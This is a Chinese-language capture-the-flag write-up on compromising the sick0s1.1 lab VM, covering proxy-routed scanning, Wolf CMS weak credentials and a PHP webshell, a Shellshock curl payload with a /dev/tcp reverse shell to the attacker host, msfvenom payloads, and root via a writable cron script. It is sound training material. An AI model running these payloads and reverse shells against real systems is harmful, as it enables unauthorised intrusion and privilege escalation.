---
title: 红队笔记-sick0s1.1
date: 2025-10-24
tags:
  - 靶场
categories:
  - 安全相关
description: sick0s1.1 靶机
---
> - kali: 192.168.181.129
> - sick0s1.1: 192.168.181.0/24 ...

信息收集

主机发现、端口扫描、漏洞扫描

```bash
nmap --min-rate 10000 -p- 192.168.181.140
nmap-sT -sV -O -p22,3128,8080 192.168.181.140
```

![[attachments/20251024.png]]

![[attachments/20251024-1.png]]

```bash
nmap -sU -p22,3128,8080 192.168.181.140
nmap --script=vuln -p22,3128,8080 192.168.181.140
```

![[attachments/20251024-2.png]]

![[attachments/20251024-3.png]]

扫描结果分析

```txt
22 ssh 优先级排后
3128 Squid http proxy 代理服务应用
8080 closed http-proxy 有代理
Linux ...
```

访问 8080 和 3128，失败，对 3128 进行目录扫描

```bash
dirb http://192.168.181.140:3128/
gobuster dir -u http://192.168.181.140:3128 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![[attachments/20251024-4.png]]

![[attachments/20251024-5.png]]

## 解法一

失败，之前 nmap 的扫描信息中都说明存在代理，将 3128 作为代理，再次扫描

```bash
# 将3128作为代理再次扫描
dirb http://192.168.181.140 -p http://192.168.181.140:3128/
```

成功扫描到目录

![[attachments/20251024-6.png]]

配置代理并访问扫描到的 URL

![[attachments/20251024-7.png]]

![[attachments/20251024-9.png]]

提示存在 wolf cms

![[attachments/20251024-10.png]]

浏览器搜索该 csm 的后台管理登录页面，弱口令 admin/admin

![[attachments/20251024-11.png]]

进入后存在多个可能存在漏洞利用的点：替换php代码、上传文件、改文件权限、可复用的头文件和脚文件 head foot。

这里利用 管理页面 php 代码部署，写入木马，nc 进行端口监听，部署网页，并重新访问修改的页面。

补充：Files 中可以上传 php 文件，写入木马，蚁剑连接同样可以实现（上传文件的目录可以搜索或扫描得到）

![[attachments/20251024-12.png]]

获得目标 shell

![[attachments/20251024-13.png]]

查询权限，目录等一系列操作，当前用户 www-data 权限有限，在网站目录下存在 config 配置文件

![[attachments/20251024-16.png]]

其中有用户名和密码，记录下来

![[attachments/20251024-14.png]]

继续查看一些敏感目录/文件

![[attachments/20251024-15.png]]

```txt
# 关注拥有shell环境的用户
/bin/sh
/bin/bash
```

ssh 尝试连接，这里用 root@xxx... 失败了，换个用户 sickos/john@123 连接成功

![[attachments/20251024-17.png]]

```bash
# 查看权限
sudo -l	# (ALL : ALL) ALL
sudo /bin/bash
```

拥有所有权限，成功获取 flag

![[attachments/20251024-18.png]]

## 解法二

接代理扫描漏洞

```bash
nikto -h 192.168.181.140 -useproxy http://192.168.181.140:3128
```

shellshock 一种影响 Bash shell 的严重安全漏洞（CVE-2014-6271），存在于 GNU Bash ≤ 4.3

> 当 Bash 解析环境变量时，如果变量值以 `() { :; };` 开头，Bash 会将其当作函数定义，并**继续执行后面的命令**。

![[attachments/20251024-19.png]]

```bash
# 漏洞测试
# 接代理测试
curl -v --proxy http://192.168.181.140:3128 http://192.168.181.140/cgi-bin/status -H "Referer:() { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"
# /cgi-bin/status目标服务器上的一个CGI脚本路径
```

![[attachments/20251024-20.png]]

```bash
# msfvenom 构造Payload
msfvenom -p cmd/unix/reverse_bash lhost=192.168.181.129 lport=443 -f raw

# 利用 shellshock 漏洞执行命令
curl -v --proxy http://192.168.181.140:3128 http://192.168.181.140/cgi-bin/status -H "Referer:() { test;}; 0<&190-;exec 190<>/dev/tcp/192.168.181.129/443;/bin/sh <&190 >&190 2>&190"
```

![[attachments/20251024-21.png]]

同时 nc 监听，获取 shell

![[attachments/20251024-22.png]]

```bash
uname -a
dpkg -l	# 查看系统安装的软件

# 系统存在python
python -c "import pty;pty.spawn('/bin/bash')"	# 获取一个交互式的shell

# 切换至网站根目录查看具体信息
cd /var/www
ls -liah
python connect.py
```

其中存在一个 py 文件

![[attachments/20251024-23.png]]

若该文件是当前 系统/网站 可执行/触发 的脚本文件，那么将木马写入该文件，系统会自动触发

寻找系统的定时任务

```bash
# 一般定时任务目录
/etc/crontab
/etc/cron.d/
```


![[attachments/20251024-24.png]]

cron.d 目录下的 automate 文件中存在定时任务

每分钟以 root 权限，运行 python 文件

接下来的操作和上面一样

```bash
msfvenom -p cmd/unix/reverse_python Lhost=192.168.181.129 lport=444 -f raw
```

![[attachments/20251024-25.png]]

![[attachments/20251024-26.png]]

成功获取 root 权限，获得 flag

![[attachments/20251024-27.png]]